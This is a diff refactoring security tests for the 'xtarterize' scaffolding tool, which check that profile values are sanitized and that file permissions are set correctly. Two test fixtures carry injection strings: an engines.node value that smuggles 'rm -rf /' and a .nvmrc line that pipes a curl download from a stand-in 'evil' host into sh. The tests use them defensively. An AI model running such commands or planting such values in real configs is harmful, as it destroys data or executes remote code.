@@ -1,84 +1,65 @@
 import fs from 'node:fs/promises';
-import os from 'node:os';
 import path from 'node:path';
-import { detectProject, writeFile } from '@xtarterize/core';
+import { writeFile } from '@xtarterize/core';
 import { describe, expect } from 'vite-plus/test';
 
 import {
   isExecutableFile,
   writeTaskDiffs,
 } from '../../packages/tasks/src/factory/ops.js';
+import { withProject } from '../helpers/project.js';
+import { withTempDir } from '../helpers/temp.js';
 
 describe('security: profile value sanitization', () => {
   test('nodeVersion contains only digits from engines.node', async () => {
-    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'xtarterize-'));
-    try {
-      await fs.writeFile(
-        path.join(tmpDir, 'package.json'),
-        JSON.stringify({
-          engines: { node: '>=18.0.0' },
-          name: 'test',
-        })
-      );
-      const profile = await detectProject(tmpDir);
-      expect(profile.nodeVersion).toMatch(/^\d+$/);
-    } finally {
-      await fs.rm(tmpDir, { force: true, recursive: true });
-    }
+    await withProject(
+      {
+        'package.json': { engines: { node: '>=18.0.0' }, name: 'test' },
+      },
+      async ({ profile }) => {
+        expect(profile.nodeVersion).toMatch(/^\d+$/);
+      }
+    );
   });
 
   test('nodeVersion extracts digits from malicious engines.node', async () => {
-    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'xtarterize-'));
-    try {
-      await fs.writeFile(
-        path.join(tmpDir, 'package.json'),
-        JSON.stringify({
-          engines: {
-            node: "22'\n      run: rm -rf /\n      ",
-          },
+    await withProject(
+      {
+        'package.json': {
+          engines: { node: "22'\n      run: rm -rf /\n      " },
           name: 'test',
-        })
-      );
-      const profile = await detectProject(tmpDir);
-      expect(profile.nodeVersion).toMatch(/^\d+$/);
-      expect(profile.nodeVersion).not.toContain('\n');
-      expect(profile.nodeVersion).not.toContain("'");
-    } finally {
-      await fs.rm(tmpDir, { force: true, recursive: true });
-    }
+        },
+      },
+      async ({ profile }) => {
+        expect(profile.nodeVersion).toMatch(/^\d+$/);
+        expect(profile.nodeVersion).not.toContain('\n');
+        expect(profile.nodeVersion).not.toContain("'");
+      }
+    );
   });
 
   test('nodeVersion extracts digits from malicious .nvmrc', async () => {
-    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'xtarterize-'));
-    try {
-      await fs.writeFile(
-        path.join(tmpDir, 'package.json'),
-        JSON.stringify({ name: 'test' })
-      );
-      await fs.writeFile(
-        path.join(tmpDir, '.nvmrc'),
-        '22\nrun: curl http://evil/payload | sh\n'
-      );
-      const profile = await detectProject(tmpDir);
-      expect(profile.nodeVersion).toMatch(/^\d+$/);
-      expect(profile.nodeVersion).not.toContain('\n');
-    } finally {
-      await fs.rm(tmpDir, { force: true, recursive: true });
-    }
+    await withProject(
+      {
+        '.nvmrc': '22\nrun: curl http://evil/payload | sh\n',
+        'package.json': { name: 'test' },
+      },
+      async ({ profile }) => {
+        expect(profile.nodeVersion).toMatch(/^\d+$/);
+        expect(profile.nodeVersion).not.toContain('\n');
+      }
+    );
   });
 
   test('packageManager is restricted to known values', async () => {
-    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'xtarterize-'));
-    try {
-      await fs.writeFile(
-        path.join(tmpDir, 'package.json'),
-        JSON.stringify({ name: 'test' })
-      );
-      const profile = await detectProject(tmpDir);
-      expect(['pnpm', 'npm', 'yarn', 'bun']).toContain(profile.packageManager);
-    } finally {
-      await fs.rm(tmpDir, { force: true, recursive: true });
-    }
+    await withProject(
+      { 'package.json': { name: 'test' } },
+      async ({ profile }) => {
+        expect(['pnpm', 'npm', 'yarn', 'bun']).toContain(
+          profile.packageManager
+        );
+      }
+    );
   });
 });
 
@@ -92,8 +73,7 @@ describe('security: husky hook file permissions', () => {
   });
 
   test('writeTaskDiffs creates hook files as executable', async () => {
-    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'xtarterize-'));
-    try {
+    await withTempDir('xtarterize-', async (tmpDir) => {
       await writeTaskDiffs(tmpDir, [
         {
           after: '#!/bin/sh\npnpm lint\n',
@@ -105,14 +85,11 @@ describe('security: husky hook file permissions', () => {
       const stat = await fs.stat(path.join(tmpDir, '.husky', 'pre-commit'));
       const isExecutable = (stat.mode & 0o111) !== 0;
       expect(isExecutable).toBe(true);
-    } finally {
-      await fs.rm(tmpDir, { force: true, recursive: true });
-    }
+    });
   });
 
   test('writeTaskDiffs creates regular files as non-executable', async () => {
-    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'xtarterize-'));
-    try {
+    await withTempDir('xtarterize-', async (tmpDir) => {
       await writeTaskDiffs(tmpDir, [
         {
           after: 'root = true\n',
@@ -124,38 +101,30 @@ describe('security: husky hook file permissions', () => {
       const stat = await fs.stat(path.join(tmpDir, '.editorconfig'));
       const isExecutable = (stat.mode & 0o111) !== 0;
       expect(isExecutable).toBe(false);
-    } finally {
-      await fs.rm(tmpDir, { force: true, recursive: true });
-    }
+    });
   });
 });
 
 describe('security: writeFile mode parameter', () => {
   test('writeFile with mode creates file with correct permissions', async () => {
-    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'xtarterize-'));
-    try {
+    await withTempDir('xtarterize-', async (tmpDir) => {
       const filePath = path.join(tmpDir, 'script.sh');
       await writeFile(filePath, '#!/bin/sh\necho hi\n', 0o755);
 
       const stat = await fs.stat(filePath);
       const isExecutable = (stat.mode & 0o111) !== 0;
       expect(isExecutable).toBe(true);
-    } finally {
-      await fs.rm(tmpDir, { force: true, recursive: true });
-    }
+    });
   });
 
   test('writeFile without mode creates non-executable file', async () => {
-    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'xtarterize-'));
-    try {
+    await withTempDir('xtarterize-', async (tmpDir) => {
       const filePath = path.join(tmpDir, 'note.txt');
       await writeFile(filePath, 'hello');
 
       const stat = await fs.stat(filePath);
       const isExecutable = (stat.mode & 0o111) !== 0;
       expect(isExecutable).toBe(false);
-    } finally {
-      await fs.rm(tmpDir, { force: true, recursive: true });
-    }
+    });
   });
 });
